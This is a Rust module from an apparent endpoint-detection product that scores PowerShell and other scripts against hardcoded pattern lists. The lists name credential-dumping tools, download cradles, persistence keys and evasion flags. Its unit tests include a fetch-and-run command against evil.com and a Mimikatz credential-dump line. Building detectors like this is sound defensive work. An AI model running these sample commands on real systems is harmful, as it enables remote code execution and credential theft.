//! AMSI Scanner - Windows Antimalware Scan Interface Integration
//!
//! Allows scanning of scripts (PowerShell, VBScript, JavaScript) for malware
//! using Windows Defender and other registered antimalware providers.
//!
//! # Usage
//! ```ignore
//! use crate::logic::advanced_detection::amsi;
//!
//! amsi::init()?;
//! let result = amsi::scan("Invoke-Expression $malicious", "PowerShell")?;
//! if result.should_block {
//!     println!("Malware detected!");
//! }
//! ```

use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Instant;
use parking_lot::Mutex;
use once_cell::sync::Lazy;

use super::types::{ScanResult, ThreatLevel, AmsiError, AmsiStats};

// ============================================================================
// GLOBAL STATE
// ============================================================================

static STATS: Lazy<Mutex<AmsiStats>> = Lazy::new(|| Mutex::new(AmsiStats::default()));
static INITIALIZED: AtomicBool = AtomicBool::new(false);

// Malicious patterns for heuristic detection (fallback when AMSI not available)
const MALICIOUS_PATTERNS: &[&str] = &[
    // PowerShell obfuscation
    "Invoke-Expression",
    "IEX(",
    "[System.Convert]::FromBase64String",
    "DownloadString",
    "DownloadFile",
    "Net.WebClient",
    "Invoke-WebRequest",
    "Start-Process",
    // Common malware signatures
    "mimikatz",
    "Invoke-Mimikatz",
    "Invoke-Kerberoast",
    "Invoke-BloodHound",
    "Empire",
    "PowerSploit",
    "Invoke-DllInjection",
    "Invoke-Shellcode",
    "Invoke-ReflectivePEInjection",
    // Credential theft
    "Get-Credential",
    "ConvertFrom-SecureString",
    "NTLM",
    "Kerberos",
    // Persistence
    "New-ScheduledTask",
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    // Evasion
    "-EncodedCommand",
    "-enc ",
    "-e ",
    "bypass",
    "-nop",
    "-noni",
    "-windowstyle hidden",
    // Ransomware patterns
    ".Encrypt",
    "CryptoStream",
    "RijndaelManaged",
    // C2 patterns
    "socket",
    "reverse",
    "bind",
    "payload",
];

// Highly suspicious patterns (automatic malware)
const HIGH_RISK_PATTERNS: &[&str] = &[
    "mimikatz",
    "Invoke-Mimikatz",
    "sekurlsa",
    "lsadump",
    "kerberos::golden",
    "Invoke-DllInjection",
    "Invoke-Shellcode",
    "meterpreter",
    "cobalt",
];

// ============================================================================
// AMSI SCANNER (Heuristic-based fallback)
// ============================================================================

/// AMSI Scanner using heuristic patterns
/// Note: Full Windows AMSI requires elevated permissions and COM initialization
pub struct AmsiScanner {
    app_name: String,
}

impl AmsiScanner {
    pub fn new(app_name: &str) -> Result<Self, AmsiError> {
        log::info!("AMSI Scanner initialized (heuristic mode): {}", app_name);
        Ok(Self {
            app_name: app_name.to_string(),
        })
    }

    /// Scan content using heuristic patterns
    pub fn scan_string(&self, content: &str, content_type: &str) -> Result<ScanResult, AmsiError> {
        if content.is_empty() {
            return Err(AmsiError::InvalidContent {
                reason: "Empty content".to_string(),
            });
        }

        let start = Instant::now();
        let content_lower = content.to_lowercase();

        // Check for high-risk patterns first
        for pattern in HIGH_RISK_PATTERNS {
            if content_lower.contains(&pattern.to_lowercase()) {
                let duration_ms = start.elapsed().as_millis() as u64;
                let result = ScanResult::new(content, content_type, 32768, duration_ms); // Malware
                update_stats(|s| {
                    s.total_scans += 1;
                    s.malware_count += 1;
                });
                log::warn!("AMSI: High-risk pattern detected: {}", pattern);
                return Ok(result);
            }
        }

        // Count suspicious patterns
        let mut score = 0u32;
        let mut found_patterns = Vec::new();

        for pattern in MALICIOUS_PATTERNS {
            if content_lower.contains(&pattern.to_lowercase()) {
                score += 1;
                found_patterns.push(*pattern);
            }
        }

        // Check for Base64 encoded commands
        if content.contains("FromBase64String") || content.contains("-EncodedCommand") {
            score += 3;
        }

        // Check for script block logging bypass
        if content_lower.contains("scriptblocklogging") && content_lower.contains("0") {
            score += 5;
        }

        let duration_ms = start.elapsed().as_millis() as u64;

        // Determine threat level based on score
        let amsi_result = if score >= 5 {
            32768 // AMSI_RESULT_DETECTED
        } else if score >= 3 {
            20000 // Suspicious but not blocked
        } else if score >= 1 {
            1 // Not detected
        } else {
            0 // Clean
        };

        let result = ScanResult::new(content, content_type, amsi_result, duration_ms);

        update_stats(|s| {
            s.total_scans += 1;
            match result.threat_level {
                ThreatLevel::Clean | ThreatLevel::NotDetected => s.clean_count += 1,
                ThreatLevel::Malware => s.malware_count += 1,
                ThreatLevel::BlockedByAdmin => s.blocked_count += 1,
            }
            s.avg_scan_time_ms = (s.avg_scan_time_ms * (s.total_scans - 1) as f64
                + duration_ms as f64) / s.total_scans as f64;
        });

        if result.should_block {
            log::warn!(
                "AMSI: Malware detected in {} content (score: {}, patterns: {:?})",
                content_type, score, found_patterns
            );
        } else if score > 0 {
            log::debug!(
                "AMSI: Suspicious patterns in {} (score: {}, patterns: {:?})",
                content_type, score, found_patterns
            );
        }

        Ok(result)
    }

    /// Scan a file
    pub fn scan_file(&self, path: &std::path::Path) -> Result<ScanResult, AmsiError> {
        let content = std::fs::read_to_string(path).map_err(|e| AmsiError::InvalidContent {
            reason: format!("Failed to read file: {}", e),
        })?;

        let content_type = path
            .extension()
            .and_then(|e| e.to_str())
            .map(|e| match e.to_lowercase().as_str() {
                "ps1" | "psm1" | "psd1" => "PowerShell",
                "vbs" | "vbe" => "VBScript",
                "js" | "jse" => "JavaScript",
                "bat" | "cmd" => "Batch",
                _ => "Unknown",
            })
            .unwrap_or("Unknown");

        self.scan_string(&content, content_type)
    }
}

// ============================================================================
// GLOBAL INSTANCE
// ============================================================================

static AMSI_SCANNER: Lazy<Mutex<Option<AmsiScanner>>> = Lazy::new(|| Mutex::new(None));

// ============================================================================
// PUBLIC API
// ============================================================================

/// Initialize the AMSI scanner
pub fn init() -> Result<(), AmsiError> {
    if INITIALIZED.load(Ordering::Relaxed) {
        return Ok(());
    }

    let scanner = AmsiScanner::new("One-Shield EDR")?;
    *AMSI_SCANNER.lock() = Some(scanner);
    INITIALIZED.store(true, Ordering::SeqCst);

    log::info!("AMSI integration initialized (heuristic mode)");
    Ok(())
}

/// Check if AMSI is available
pub fn is_available() -> bool {
    INITIALIZED.load(Ordering::Relaxed)
}

/// Scan content for malware
pub fn scan(content: &str, content_type: &str) -> Result<ScanResult, AmsiError> {
    let guard = AMSI_SCANNER.lock();
    let scanner = guard.as_ref().ok_or(AmsiError::NotAvailable)?;
    scanner.scan_string(content, content_type)
}

/// Scan a file for malware
pub fn scan_file(path: &std::path::Path) -> Result<ScanResult, AmsiError> {
    let guard = AMSI_SCANNER.lock();
    let scanner = guard.as_ref().ok_or(AmsiError::NotAvailable)?;
    scanner.scan_file(path)
}

/// Quick check if content is malicious
pub fn is_malicious(content: &str, content_type: &str) -> bool {
    scan(content, content_type)
        .map(|r| r.should_block)
        .unwrap_or(false)
}

/// Get AMSI statistics
pub fn get_stats() -> AmsiStats {
    STATS.lock().clone()
}

/// Reset statistics
pub fn reset_stats() {
    *STATS.lock() = AmsiStats::default();
}

fn update_stats<F: FnOnce(&mut AmsiStats)>(f: F) {
    f(&mut STATS.lock());
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_content() {
        init().unwrap();
        let result = scan("Write-Host 'Hello World'", "PowerShell").unwrap();
        assert_eq!(result.threat_level, ThreatLevel::Clean);
        assert!(!result.should_block);
    }

    #[test]
    fn test_suspicious_content() {
        init().unwrap();
        let result = scan("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload')", "PowerShell").unwrap();
        assert!(result.should_block);
    }

    #[test]
    fn test_mimikatz_detection() {
        init().unwrap();
        let result = scan("Invoke-Mimikatz -DumpCreds", "PowerShell").unwrap();
        assert_eq!(result.threat_level, ThreatLevel::Malware);
        assert!(result.should_block);
    }

    #[test]
    fn test_encoded_command() {
        init().unwrap();
        let result = scan("powershell -EncodedCommand JABzAD0A...", "PowerShell").unwrap();
        assert!(result.amsi_result > 0); // Should be flagged
    }
}
